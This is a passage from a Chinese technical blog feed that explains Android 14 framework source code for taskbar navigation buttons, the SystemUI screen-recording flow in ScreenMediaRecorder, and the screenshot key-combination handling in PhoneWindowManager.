<span class="number">90</span> : -<span class="number">90</span>, <span class="number">0</span>));</span><br><span class="line">    <span class="comment">// Translate back button to be at end/start of other buttons for keyguard</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">navButtonSize</span> <span class="operator">=</span> mContext.getResources().getDimensionPixelSize(</span><br><span class="line">            R.dimen.taskbar_nav_buttons_size);</span><br><span class="line">    mPropertyHolders.add(<span class="keyword">new</span> <span class="title class_">StatePropertyHolder</span>(</span><br><span class="line">            mBackButton, flags -&gt; (flags &amp; FLAG_ONLY_BACK_FOR_BOUNCER_VISIBLE) != <span class="number">0</span></span><br><span class="line">                    || (flags &amp; FLAG_KEYGUARD_VISIBLE) != <span class="number">0</span>,</span><br><span class="line">            VIEW_TRANSLATE_X, navButtonSize * (isRtl ? -<span class="number">2</span> : <span class="number">2</span>), <span class="number">0</span>));</span><br><span class="line">    <span class="comment">// home button</span></span><br><span class="line">    mHomeButton = addButton(R.drawable.ic_sysbar_home, BUTTON_HOME, navContainer,</span><br><span class="line">            navButtonController, R.id.home);</span><br><span class="line">    mHomeButtonAlpha = <span class="keyword">new</span> <span class="title class_">MultiValueAlpha</span>(mHomeButton, NUM_ALPHA_CHANNELS);</span><br><span class="line">    mHomeButtonAlpha.setUpdateVisibility(<span class="literal">true</span>);</span><br><span class="line">    mPropertyHolders.add(</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">StatePropertyHolder</span>(mHomeButtonAlpha.getProperty(</span><br><span class="line">                    ALPHA_INDEX_KEYGUARD_OR_DISABLE),</span><br><span class="line">            flags -&gt; (flags &amp; FLAG_KEYGUARD_VISIBLE) == <span class="number">0</span> &amp;&amp;</span><br><span class="line">                    (flags &amp; FLAG_DISABLE_HOME) == <span class="number">0</span>));</span><br><span class="line">    <span class="comment">// Recents button</span></span><br><span class="line">    <span class="type">View</span> <span class="variable">recentsButton</span> <span class="operator">=</span> addButton(R.drawable.ic_sysbar_recent, BUTTON_RECENTS,</span><br><span class="line">            navContainer, navButtonController, R.id.recent_apps);</span><br><span class="line">    mHitboxExtender.init(recentsButton, mNavButtonsView, mContext.getDeviceProfile(),</span><br><span class="line">            () -&gt; &#123;</span><br><span class="line">                <span class="type">float</span>[] recentsCoords = <span class="keyword">new</span> <span class="title class_">float</span>[<span class="number">2</span>];</span><br><span class="line">                getDescendantCoordRelativeToAncestor(recentsButton, mNavButtonsView,</span><br><span class="line">                        recentsCoords, <span class="literal">false</span>);</span><br><span class="line">                <span class="keyword">return</span> recentsCoords;</span><br><span class="line">            &#125;, <span class="keyword">new</span> <span class="title class_">Handler</span>());</span><br><span class="line">    recentsButton.setOnClickListener(v -&gt; &#123;</span><br><span class="line">        navButtonController.onButtonClick(BUTTON_RECENTS);</span><br><span class="line">        mHitboxExtender.onRecentsButtonClicked();</span><br><span class="line">    &#125;);</span><br><span class="line">    mPropertyHolders.add(<span class="keyword">new</span> <span class="title class_">StatePropertyHolder</span>(recentsButton,</span><br><span class="line">            flags -&gt; (flags &amp; FLAG_KEYGUARD_VISIBLE) == <span class="number">0</span> &amp;&amp; (flags &amp; FLAG_DISABLE_RECENTS) == <span class="number">0</span></span><br><span class="line">                    &amp;&amp; !mContext.isNavBarKidsModeActive()));</span><br><span class="line">    <span class="comment">// A11y button</span></span><br><span class="line">    mA11yButton =  (R.drawable.ic_sysbar_accessibility_button, BUTTON_A11Y,</span><br><span class="line">            endContainer, navButtonController, R.id.accessibility_button,</span><br><span class="line">            R.layout.taskbar_contextual_button);</span><br><span class="line">    mPropertyHolders.add(<span class="keyword">new</span> <span class="title class_">StatePropertyHolder</span>(mA11yButton,</span><br><span class="line">            flags -&gt; (flags &amp; FLAG_A11Y_VISIBLE) != <span class="number">0</span></span><br><span class="line">                    &amp;&amp; (flags &amp; FLAG_ROTATION_BUTTON_VISIBLE) == <span class="number">0</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>事件的在 <strong>addButton()</strong> 的时候直接设置了，而且有特殊需求的，会单独设置。</p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> SystemUI </tag>
            
            <tag> framework </tag>
            
            <tag> Launcher </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android 14 录屏流程解析</title>
      <link href="/2024/02/11/2024-02-11/"/>
      <url>/2024/02/11/2024-02-11/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在 Android14 中录屏有个专门的类 <strong>ScreenMediaRecorder.java</strong> 。我们先看 <strong>ScreenMediaRecorder#start()</strong> 方法：<br><strong>frameworks/base/packages/SystemUI/src/com/android/systemui/screenrecord/ScreenMediaRecorder.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> <span class="keyword">throws</span> IOException, RemoteException, RuntimeException &#123;</span><br><span class="line">    Log.d(TAG, <span class="string">&quot;start recording&quot;</span>);</span><br><span class="line">    <span class="comment">// 准备录屏</span></span><br><span class="line">    prepare();</span><br><span class="line">    <span class="comment">// 开始录屏</span></span><br><span class="line">    mMediaRecorder.start();</span><br><span class="line">    <span class="comment">// 开始内部音频录制</span></span><br><span class="line">    recordInternalAudio();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个 <strong>ScreenMediaRecorder#start()</strong> 在 <strong>RecordingService.java</strong> 的 <strong>onStartCommand()</strong> 方法里被调用。<br>接着看 <strong>ScreenMediaRecorder#prepare()</strong> 准备录屏：<br><strong>frameworks/base/packages/SystemUI/src/com/android/systemui/screenrecord/ScreenMediaRecorder.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">prepare</span><span class="params">()</span> <span class="keyword">throws</span> IOException, RemoteException, RuntimeException &#123;</span><br><span class="line">    <span class="comment">//Setup media projection</span></span><br><span class="line">    <span class="comment">// 拉起 MEDIA_PROJECTION_SERVICE</span></span><br><span class="line">    <span class="type">IBinder</span> <span class="variable">b</span> <span class="operator">=</span> ServiceManager.getService(MEDIA_PROJECTION_SERVICE);</span><br><span class="line">    <span class="type">IMediaProjectionManager</span> <span class="variable">mediaService</span> <span class="operator">=</span></span><br><span class="line">            IMediaProjectionManager.Stub.asInterface(b);</span><br><span class="line">    <span class="type">IMediaProjection</span> <span class="variable">proj</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    proj = mediaService.createProjection(mUser, mContext.getPackageName(),</span><br><span class="line">                MediaProjectionManager.TYPE_SCREEN_CAPTURE, <span class="literal">false</span>);</span><br><span class="line">    <span class="type">IBinder</span> <span class="variable">projection</span> <span class="operator">=</span> proj.asBinder();</span><br><span class="line">    mMediaProjection = <span class="keyword">new</span> <span class="title class_">MediaProjection</span>(mContext,</span><br><span class="line">            IMediaProjection.Stub.asInterface(projection));</span><br><span class="line">    <span class="comment">// 创建文件、设置格式</span></span><br><span class="line">    <span class="type">File</span> <span class="variable">cacheDir</span> <span class="operator">=</span> mContext.getCacheDir();</span><br><span class="line">    cacheDir.mkdirs();</span><br><span class="line">    mTempVideoFile = File.createTempFile(<span class="string">&quot;temp&quot;</span>, <span class="string">&quot;.mp4&quot;</span>, cacheDir);</span><br><span class="line">    <span class="comment">// 设置媒体记录器</span></span><br><span class="line">    <span class="comment">// MediaRecorde 主要提供了一些方法用来支持录屏录音</span></span><br><span class="line">    mMediaRecorder = <span class="keyword">new</span> <span class="title class_">MediaRecorder</span>();</span><br><span class="line">    <span class="comment">// 设置音频源</span></span><br><span class="line">    <span class="keyword">if</span> (mAudioSource == MIC) &#123;</span><br><span class="line">        <span class="comment">// 设置声音来源，一般传入 MediaRecorder. AudioSource.MIC参数指定录制来自麦克风的声音。（这里如果只录屏可以不设置）</span></span><br><span class="line">        mMediaRecorder.setAudioSource(MediaRecorder.AudioSource.DEFAULT);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 设置用于录制的视频来源。如屏幕等</span></span><br><span class="line">    mMediaRecorder.setVideoSource(MediaRecorder.VideoSource.SURFACE);</span><br><span class="line">    <span class="comment">// 设置所录制的音视频文件的格式。</span></span><br><span class="line">    mMediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);</span><br><span class="line">    <span class="comment">// 设置视频</span></span><br><span class="line">    <span class="type">DisplayMetrics</span> <span class="variable">metrics</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DisplayMetrics</span>();</span><br><span class="line">    <span class="type">WindowManager</span> <span class="variable">wm</span> <span class="operator">=</span> (WindowManager) mContext.getSystemService(Context.WINDOW_SERVICE);</span><br><span class="line">    wm.getDefaultDisplay().getRealMetrics(metrics);</span><br><span class="line">    <span class="type">int</span> <span class="variable">refreshRate</span> <span class="operator">=</span> (<span class="type">int</span>) wm.getDefaultDisplay().getRefreshRate();</span><br><span class="line">    <span class="type">int</span>[] dimens = getSupportedSize(metrics.widthPixels, metrics.heightPixels, refreshRate);</span><br><span class="line">    <span class="type">int</span> <span class="variable">width</span> <span class="operator">=</span> dimens[<span class="number">0</span>];</span><br><span class="line">    <span class="type">int</span> <span class="variable">height</span> <span class="operator">=</span> dimens[<span class="number">1</span>];</span><br><span class="line">    refreshRate = dimens[<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span> <span class="variable">vidBitRate</span> <span class="operator">=</span> width * height * refreshRate / VIDEO_FRAME_RATE</span><br><span class="line">            * VIDEO_FRAME_RATE_TO_RESOLUTION_RATIO;</span><br><span class="line">    <span class="comment">// 设置视频的编码格式</span></span><br><span class="line">    mMediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);</span><br><span class="line">    mMediaRecorder.setVideoEncodingProfileLevel(</span><br><span class="line">            MediaCodecInfo.CodecProfileLevel.AVCProfileHigh,</span><br><span class="line">            MediaCodecInfo.CodecProfileLevel.AVCLevel3);</span><br><span class="line">    <span class="comment">// 设置要拍摄的宽度和视频的高度，最高只能设置640x480</span></span><br><span class="line">    mMediaRecorder.setVideoSize(width, height);</span><br><span class="line">    <span class="comment">// 设置录制视频的捕获帧速率</span></span><br><span class="line">    mMediaRecorder.setVideoFrameRate(refreshRate);</span><br><span class="line">    <span class="comment">// 设置所录制视频的编码位率</span></span><br><span class="line">    mMediaRecorder.setVideoEncodingBitRate(vidBitRate);</span><br><span class="line">    <span class="comment">// 设置录制会话的最长持续时间（以ms为单位）</span></span><br><span class="line">    mMediaRecorder.setMaxDuration(MAX_DURATION_MS);</span><br><span class="line">    <span class="comment">// 设置最大文件大小</span></span><br><span class="line">    mMediaRecorder.setMaxFileSize(MAX_FILESIZE_BYTES);</span><br><span class="line">    <span class="comment">// 设置音频</span></span><br><span class="line">    <span class="keyword">if</span> (mAudioSource == MIC) &#123;</span><br><span class="line">        <span class="comment">// 设置音频编码格式</span></span><br><span class="line">        mMediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.HE_AAC);</span><br><span class="line">        mMediaRecorder.setAudioChannels(TOTAL_NUM_TRACKS);</span><br><span class="line">        <span class="comment">// 设置所录制视频的编码位率</span></span><br><span class="line">        mMediaRecorder.setAudioEncodingBitRate(AUDIO_BIT_RATE);</span><br><span class="line">        mMediaRecorder.setAudioSamplingRate(AUDIO_SAMPLE_RATE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 设置录制的音频文件的保存位置</span></span><br><span class="line">    mMediaRecorder.setOutputFile(mTempVideoFile);</span><br><span class="line">    <span class="comment">// 准备录制</span></span><br><span class="line">    mMediaRecorder.prepare();</span><br><span class="line">    <span class="comment">// Create surface</span></span><br><span class="line">    mInputSurface = mMediaRecorder.getSurface();</span><br><span class="line">    <span class="comment">// VirtualDisplay类代表一个虚拟显示器，需要调用DisplayManager 类的 createVirtualDisplay()方法，</span></span><br><span class="line">    <span class="comment">// 将虚拟显示器的内容渲染在一个Surface控件上，即 捕捉屏幕了。</span></span><br><span class="line">    mVirtualDisplay = mMediaProjection.createVirtualDisplay(</span><br><span class="line">            <span class="string">&quot;Recording Display&quot;</span>,    <span class="comment">// 实际的流媒体显示实体名字，不能为null;</span></span><br><span class="line">            width,                  <span class="comment">// 实际的流媒体显示实体的宽度，单位为像素，必须大于0</span></span><br><span class="line">            height,                 <span class="comment">// 实际的流媒体显示实体的高度，单位为像素，必须大于0;</span></span><br><span class="line">            metrics.densityDpi,     <span class="comment">// 实际的流媒体显示实体的像素密度，单位为dp，必须大于0;</span></span><br><span class="line">            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,    <span class="comment">// 实际的流媒体显示实体标志的结合</span></span><br><span class="line">            mInputSurface,          <span class="comment">// 播放流媒体的surface实例，可为null，</span></span><br><span class="line">            <span class="literal">null</span>,                   <span class="comment">// 实际的流媒体显示实体状态改变时的回调方法，可能为null;</span></span><br><span class="line">            <span class="literal">null</span>);                  <span class="comment">// 调用第 7 个参数回调方法的handler</span></span><br><span class="line">    mMediaRecorder.setOnInfoListener(mListener);</span><br><span class="line">    <span class="keyword">if</span> (mAudioSource == INTERNAL ||</span><br><span class="line">            mAudioSource == MIC_AND_INTERNAL) &#123;</span><br><span class="line">        mTempAudioFile = File.createTempFile(<span class="string">&quot;temp&quot;</span>, <span class="string">&quot;.aac&quot;</span>,</span><br><span class="line">                mContext.getCacheDir());</span><br><span class="line">        mAudio = <span class="keyword">new</span> <span class="title class_">ScreenInternalAudioRecorder</span>(mTempAudioFile.getAbsolutePath(),</span><br><span class="line">                mMediaProjection, mAudioSource == MIC_AND_INTERNAL);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述 <strong>prepare()</strong> 方法，主要：进行了拉起后台服务，创建 <strong>VirtualDisplay</strong> 用于屏幕参数设定、设置录屏问文件路径等操作；<br>再接着看 <strong>ScreenMediaRecorder#end()</strong> 方法：<br><strong>frameworks/base/packages/SystemUI/src/com/android/systemui/screenrecord/ScreenMediaRecorder.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">end</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="type">Closer</span> <span class="variable">closer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Closer</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// MediaRecorder might throw RuntimeException if stopped immediately after starting</span></span><br><span class="line">    <span class="comment">// We should remove the recording in this case as it will be invalid</span></span><br><span class="line">    closer.register(mMediaRecorder::stop);</span><br><span class="line">    closer.register(mMediaRecorder::release);</span><br><span class="line">    closer.register(mInputSurface::release);</span><br><span class="line">    closer.register(mVirtualDisplay::release);</span><br><span class="line">    closer.register(mMediaProjection::stop);</span><br><span class="line">    closer.register(<span class="built_in">this</span>::stopInternalAudioRecording);</span><br><span class="line"></span><br><span class="line">    closer.close();</span><br><span class="line"></span><br><span class="line">    mMediaRecorder = <span class="literal">null</span>;</span><br><span class="line">    mMediaProjection = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    Log.d(TAG, <span class="string">&quot;end recording&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>end()</strong> 方法结束录屏，调用了<strong>mMediaRecorder</strong>的<strong>stop</strong>与<strong>release</strong>方法， <strong>stopInternalAudioRecording()</strong> 方法中通过 <strong>mAudio.end()</strong> 方法来停止录音。</p><h4 id="缩略图"><a href="#缩略图" class="headerlink" title="缩略图"></a>缩略图</h4><p>在谷歌原生设计中，录屏的缩略图并非是视频的第一帧，而是前20帧中的最大有效帧作为预览图。这种设计的好处是避免了第一帧是黑色或者不清楚，从而使得用户看起来比较清晰，更好辨别出所录的视频内容；</p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> SystemUI </tag>
            
            <tag> framework </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android 14 截屏流程解析</title>
      <link href="/2024/02/10/2024-02-10/"/>
      <url>/2024/02/10/2024-02-10/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>一般截屏都是电源键+音量减键，而这些按键的处理都是在 <strong>PhoneWindowManager</strong> 中进行的，但在该类中有两个主要处理按键的方法:</p><ul><li>interceptKeyBeforeQueueing()：主要处理音量键、电源键（Power键）、耳机键等。</li><li>interceptKeyBeforeDispatching()：处理一般性的按键和动作。</li></ul><p>参数含义：</p><ul><li>interactive：是否亮屏</li><li>KeyEvent.FLAG_FALLBACK：不被应用处理的按键事件或一些在  键值映射中不被处理的事件(例：轨迹球事件等)。</li></ul><p>这里我们直接看 <strong>PhoneWindowManager#interceptKeyBeforeQueueing()</strong> 方法：<br><strong>frameworks/base/services/core/java/com/android/server/policy/PhoneWindowManager.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">interceptKeyBeforeQueueing</span><span class="params">(KeyEvent event, <span class="type">int</span> policyFlags)</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">keyCode</span> <span class="operator">=</span> event.getKeyCode();</span><br><span class="line">    <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">down</span> <span class="operator">=</span> event.getAction() == KeyEvent.ACTION_DOWN;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">isWakeKey</span> <span class="operator">=</span> (policyFlags &amp; WindowManagerPolicy.FLAG_WAKE) != <span class="number">0</span></span><br><span class="line">            || event.isWakeKey();</span><br><span class="line">    <span class="keyword">if</span> (!mSystemBooted) &#123;</span><br><span class="line">        <span class="comment">// 省略部分代码......</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 省略部分代码......</span></span><br><span class="line">    <span class="comment">// This could prevent some wrong state in multi-displays environment,</span></span><br><span class="line">    <span class="comment">// the default display may turned off but interactive is true.</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">isDefaultDisplayOn</span> <span class="operator">=</span> Display.isOnState(mDefaultDisplay.getState());</span><br><span class="line">    <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">interactiveAndOn</span> <span class="operator">=</span> interactive &amp;&amp; isDefaultDisplayOn;</span><br><span class="line">    <span class="keyword">if</span> ((event.getFlags() &amp; KeyEvent.FLAG_FALLBACK) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 这里面有·组合键处理，Android 14 与之前版本不一样</span></span><br><span class="line">        <span class="comment">// 在Android 14 有专门的组合键处理，可自行添加规则（即：组合键）</span></span><br><span class="line">        handleKeyGesture(event, interactiveAndOn);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 省略部分代码......</span></span><br><span class="line">    <span class="keyword">switch</span> (keyCode) &#123;</span><br><span class="line">        <span class="comment">// 省略部分代码......</span></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码里说的组合键添加，在 <strong>initKeyCombinationRules()</strong> 方法中，并在PhoneWindowManager的 <strong>init()</strong> 方法中初始化。关于 <strong>initKeyCombinationRules()</strong> 方法，下文会有讲述。<br>下面接着看 <strong>PhoneWindowManager#handleKeyGesture()</strong> 方法：<br><strong>frameworks/base/services/core/java/com/android/server/policy/PhoneWindowManager.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">handleKeyGesture</span><span class="params">(KeyEvent event, <span class="type">boolean</span> interactive)</span> &#123;</span><br><span class="line">    <span class="comment">// 在 if 判断中，调用组合键判断；</span></span><br><span class="line">    <span class="comment">// 在将键事件发送到窗口之前，检查键事件是否可以被组合键规则拦截。</span></span><br><span class="line">    <span class="comment">// 如果键事件可以触发任何活动规则，则返回 true，否则返回 false。</span></span><br><span class="line">    <span class="keyword">if</span> (mKeyCombinationManager.interceptKey(event, interactive)) &#123;</span><br><span class="line">        <span class="comment">// handled by combo keys manager.</span></span><br><span class="line">        mSingleKeyGestureDetector.reset();</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (event.getKeyCode() == KEYCODE_POWER &amp;&amp; event.getAction() == KeyEvent.ACTION_DOWN) &#123;</span><br><span class="line">        <span class="comment">// 触发KEYCODE_POWER 和 ACTION_DOWN事件</span></span><br><span class="line">        mPowerKeyHandled = handleCameraGesture(event, interactive);</span><br><span class="line">        <span class="keyword">if</span> (mPowerKeyHandled) &#123;</span><br><span class="line">            <span class="comment">// handled by camera gesture.</span></span><br><span class="line">            mSingleKeyGestureDetector.reset();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    mSingleKeyGestureDetector.interceptKey(event, interactive);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们主要看 <strong>mKeyCombinationManager.interceptKey(event, interactive)</strong> 方法就行了；<br><strong>KeyCombinationManager#interceptKey():</strong><br><strong>frameworks/base/services/core/java/com/android/server/policy/KeyCombinationManager.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">boolean</span> <span class="title function_">interceptKey</span><span class="params">(KeyEvent event, <span class="type">boolean</span> interactive)</span> &#123;</span><br><span class="line">    <span class="keyword">synchronized</span> (mLock) &#123;</span><br><span class="line">        <span class="keyword">return</span> interceptKeyLocked(event, interactive);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">interceptKeyLocked</span><span class="params">(KeyEvent event, <span class="type">boolean</span> interactive)</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">down</span> <span class="operator">=</span> event.getAction() == KeyEvent.ACTION_DOWN;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">keyCode</span> <span class="operator">=</span> event.getKeyCode();</span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> mActiveRules.size();</span><br><span class="line">    <span class="keyword">final</span> <span class="type">long</span> <span class="variable">eventTime</span> <span class="operator">=</span> event.getEventTime();</span><br><span class="line">    <span class="keyword">if</span> (interactive &amp;&amp; down) &#123;</span><br><span class="line">        <span class="comment">// 省略部分代码......</span></span><br><span class="line">        <span class="keyword">if</span> (mDownTimes.size() == <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="comment">// 省略部分代码......</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 如果规则已经触发则忽略.</span></span><br><span class="line">            <span class="keyword">if</span> (mTriggeredRule != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 发送给客户端之前的过度延迟。</span></span><br><span class="line">            forAllActiveRules((rule) -&gt; &#123;</span><br><span class="line">                <span class="keyword">if</span> (!rule.shouldInterceptKeys(mDownTimes)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                Log.v(TAG, <span class="string">&quot;Performing combination rule : &quot;</span> + rule);</span><br><span class="line">                <span class="comment">// 主要是这个方法，会执行 execute() 方法，</span></span><br><span class="line">                <span class="comment">// 该方法是一个 抽象方法，会在添加组合键规则的地方实现；</span></span><br><span class="line">                mHandler.post(rule::execute);</span><br><span class="line">                mTriggeredRule = rule;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;);</span><br><span class="line">            mActiveRules.clear();</span><br><span class="line">            <span class="keyword">if</span> (mTriggeredRule != <span class="literal">null</span>) &#123;</span><br><span class="line">                mActiveRules.add(mTriggeredRule);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 省略部分代码......</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们看下组合键添加，及触发回调。<br><strong>initKeyCombinationRules()</strong><br><strong>frameworks/base/services/core/java/com/android/server/policy/PhoneWindowManager.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 